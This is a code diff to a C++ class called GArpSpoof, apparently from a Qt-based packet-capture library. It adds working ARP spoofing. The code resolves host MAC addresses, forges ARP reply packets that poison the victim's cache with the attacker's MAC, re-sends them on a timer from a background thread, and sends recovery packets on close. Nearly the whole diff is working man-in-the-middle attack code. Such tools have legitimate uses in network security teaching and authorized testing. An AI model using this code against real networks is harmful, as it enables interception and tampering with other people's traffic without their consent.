@@ -66,10 +66,13 @@ bool GArpSpoof::doOpen() {
 			atm_[session.targetIp_] = session.targetMac_;
 	}
 
-	State backup = this->state_;
-	this->state_ = Opened; // change state for waitAll
-	bool res = atm_.waitAll(this);
-	this->state_ = backup;
+	GSyncPcapDevice device;
+	device.devName_ = this->devName_;
+	if (!device.open()) {
+		err = device.err;
+		return false;
+	}
+	bool res = atm_.waitAll(&device);
 	if (!res) {
 		QString msg = "can not find all host(s) ";
 		for (GAtm::iterator it = atm_.begin(); it != atm_.end(); it++) {
@@ -82,10 +85,86 @@ bool GArpSpoof::doOpen() {
 		SET_ERR(GErr::FAIL, msg);
 		return false;
 	}
+	device.close();
+
+	for(Session& session: sessionList_) {
+		if (session.senderMac_.isClean())
+			session.senderMac_ = atm_[session.senderIp_];
+		if (session.targetMac_.isClean())
+			session.targetMac_ = atm_[session.targetIp_];
+	}
+
+	attackMac_ = virtualMac_.isClean() ? intf_.mac() : virtualMac_;
+
+	sendArpInfectAll();
+
+	if (infectInterval_ != 0)
+		infectThread_.start();
+
 	return true;
 }
 
 bool GArpSpoof::doClose() {
 	qDebug() << ""; // gilgil temp 2019.08.16
+	infectThread_.we_.wakeAll();
+	infectThread_.wait();
+
+	for (int i = 0; i < 3; i++) {
+		sendARPReciverAll();
+		QThread::msleep(100);
+	}
+
   return GPcapDevice::doClose();
+}
+
+void GArpSpoof::InfectThread::run() {
+	while (true) {
+		if (we_.wait(arpSpoof_->infectInterval_)) break;
+		arpSpoof_->sendArpInfectAll();
+	}
+}
+
+bool GArpSpoof::sendArpInfectAll() {
+	for (Session& session: sessionList_) {
+		if (!sendArpInfect(&session))
+			return false;
+	}
+	return true;
+}
+
+bool GArpSpoof::sendArpInfect(Session* session) {
+	return sendArp(session, true);
+}
+
+bool GArpSpoof::sendARPReciverAll() {
+	for (Session& session: sessionList_) {
+		if (!sendArpRecover(&session))
+			return false;
+	}
+	return true;
+}
+
+bool GArpSpoof::sendArpRecover(Session* session) {
+	return sendArp(session, false);
+}
+
+bool GArpSpoof::sendArp(Session* session, bool infect) {
+	GEthArpHdr sendPacket;
+
+	sendPacket.ethHdr_.dmac_ = session->senderMac_;
+	sendPacket.ethHdr_.smac_ = attackMac_;
+	sendPacket.ethHdr_.type_ = htons(GEthHdr::Arp);
+
+	sendPacket.arpHdr_.hrd_ = htons(GArpHdr::ETHER);
+	sendPacket.arpHdr_.pro_ = htons(GEthHdr::Ip4);
+	sendPacket.arpHdr_.hln_ = sizeof(GMac);
+	sendPacket.arpHdr_.pln_ = sizeof(GIp);
+	sendPacket.arpHdr_.op_ = htons(GArpHdr::Reply);
+	sendPacket.arpHdr_.smac_ = infect ? attackMac_ : session->targetMac_;
+	sendPacket.arpHdr_.sip_ = htonl(session->targetIp_);
+	sendPacket.arpHdr_.tmac_ = session->senderMac_;
+	sendPacket.arpHdr_.tip_ = htonl(session->senderIp_);
+
+	GPacket::Result res = write(GBuf(pbyte(&sendPacket), sizeof(sendPacket)));
+	return res == GPacket::Ok;
 }
